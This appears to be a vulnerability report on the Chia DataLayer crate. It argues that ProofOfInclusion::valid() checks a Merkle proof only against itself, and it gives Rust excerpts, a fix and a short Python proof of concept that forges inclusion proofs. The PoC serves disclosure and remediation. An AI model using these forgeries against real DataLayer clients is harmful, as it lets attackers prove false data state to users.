### Title
`ProofOfInclusion::valid()` Tautological Root-Hash Check Allows Forged DataLayer Inclusion Proofs - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary

`ProofOfInclusion::valid()` performs a final comparison that is always trivially true: it compares `existing_hash` (which was set to `calculated_hash` in the last loop iteration, already verified to equal `layer.combined_hash`) against `self.root_hash()` which returns that same `last.combined_hash`. The external committed Merkle root is never checked. Any internally self-consistent proof — including a trivially forged one with empty `layers` — passes `valid()`.

### Finding Description

`ProofOfInclusion::valid()` in `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs` is the sole verification method for DataLayer inclusion proofs. Its logic is:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    existing_hash == self.root_hash()   // ← tautological
}
``` [1](#0-0) 

After the loop, `existing_hash` holds the last `calculated_hash`, which was already asserted equal to `layer.combined_hash` by the `if` guard. `root_hash()` returns exactly that same value:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash   // ← same value existing_hash was just set to
    } else {
        self.node_hash
    }
}
``` [2](#0-1) 

So the final comparison `existing_hash == self.root_hash()` reduces to `last.combined_hash == last.combined_hash`, which is unconditionally `true`. No external committed root hash is ever supplied to or checked by `valid()`.

**Empty-layers degenerate case (simplest exploit):** With `layers = []`, the loop body never executes, `existing_hash` stays as `self.node_hash`, and `root_hash()` also returns `self.node_hash`. The check becomes `node_hash == node_hash` — always `true` for any arbitrary `node_hash`.

The struct is `Streamable` and exposed via Python bindings with `from_py_object`, so an attacker can trivially construct and submit a forged `ProofOfInclusion`: [3](#0-2) 

`get_proof_of_inclusion` on `MerkleBlob` generates legitimate proofs, but `valid()` is also the verification path for externally received proofs: [4](#0-3) 

The Python type stub exposes `valid()` as the sole verification API with no root-hash parameter: [5](#0-4) 

### Impact Explanation

An attacker who can submit a `ProofOfInclusion` to any DataLayer client that calls `proof.valid()` can forge inclusion of any key-value pair in any tree. The attacker constructs `ProofOfInclusion { node_hash: H_forged, layers: [] }` — `valid()` returns `true`. The `root_hash()` of this forged proof is `H_forged` itself, not the actual committed on-chain root. Since `valid()` never compares against an external root, the forgery is undetected. This allows untrusted input to prove invalid DataLayer state, matching the allowed High impact: *"DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion … or lets untrusted input prove invalid state."*

### Likelihood Explanation

The `ProofOfInclusion` struct is `Streamable` (deserializable from bytes) and exposed via Python bindings with `from_py_object`. Any DataLayer client that receives a proof from an untrusted peer and calls only `proof.valid()` — the intended and only verification API — is vulnerable. The attack requires no special privileges, no key material, and no knowledge of the actual tree contents.

### Recommendation

`valid()` must accept an external root hash and compare the computed chain result against it:

```rust
pub fn valid_against_root(&self, expected_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    &existing_hash == expected_root   // compare against externally committed root
}
```

The current `valid()` (which only checks internal self-consistency) should either be removed or clearly documented as insufficient for security purposes. All call sites must be updated to supply the known committed root hash.

### Proof of Concept

```python
from chia_rs.datalayer import ProofOfInclusion, ProofOfInclusionLayer

# Forge a proof claiming any arbitrary hash is "included"
forged_node_hash = bytes([0xAB] * 32)  # attacker-chosen leaf hash
forged_proof = ProofOfInclusion(node_hash=forged_node_hash, layers=[])

# valid() returns True despite no real tree existing
assert forged_proof.valid()           # passes — tautological check
assert forged_proof.root_hash() == forged_node_hash  # "root" is just the forged hash

# Non-empty layers: attacker builds an internally consistent chain
# with a fabricated sibling hash — still passes valid()
from chia_rs.datalayer import Side
fake_other = bytes([0x11] * 32)
import hashlib
combined = hashlib.sha256(b"\x02" + fake_other + forged_node_hash).digest()
layer = ProofOfInclusionLayer(
    other_hash_side=Side.Left,
    other_hash=fake_other,
    combined_hash=combined,
)
forged_proof2 = ProofOfInclusion(node_hash=forged_node_hash, layers=[layer])
assert forged_proof2.valid()  # also passes — combined_hash is self-referential
```

    pub fn get_proof_of_inclusion(
        &self,
        key: KeyId,
    ) -> Result<proof_of_inclusion::ProofOfInclusion, Error> {
        let mut index = *self
            .block_status_cache
            .get_index_by_key(key)
            .ok_or(Error::UnknownKey(key))?;

        let node = self
            .get_node(index)?
            .expect_leaf("key to index mapping should only have leaves");

        let parents = self.get_lineage_blocks_with_indexes(index)?;
        let mut layers: Vec<proof_of_inclusion::ProofOfInclusionLayer> = Vec::new();
        let mut parents_iter = parents.iter();
        // first in the lineage is the index itself, second is the first parent
        parents_iter.next();
        for (next_index, block) in parents_iter {
            if block.metadata.dirty {
                return Err(Error::Dirty(*next_index));
            }
            let parent = block
                .node
                .expect_internal("all nodes after the first should be internal");
            let sibling_index = parent.sibling_index(index)?;
            let sibling_block = self.get_block(sibling_index)?;
            let sibling = sibling_block.node;
            let layer = proof_of_inclusion::ProofOfInclusionLayer {
                other_hash_side: parent.get_sibling_side(index)?,
                other_hash: sibling.hash(),
                combined_hash: parent.hash,
            };
            layers.push(layer);
            index = *next_index;
        }

        Ok(proof_of_inclusion::ProofOfInclusion {
            node_hash: node.hash,
            layers,
        })
    }
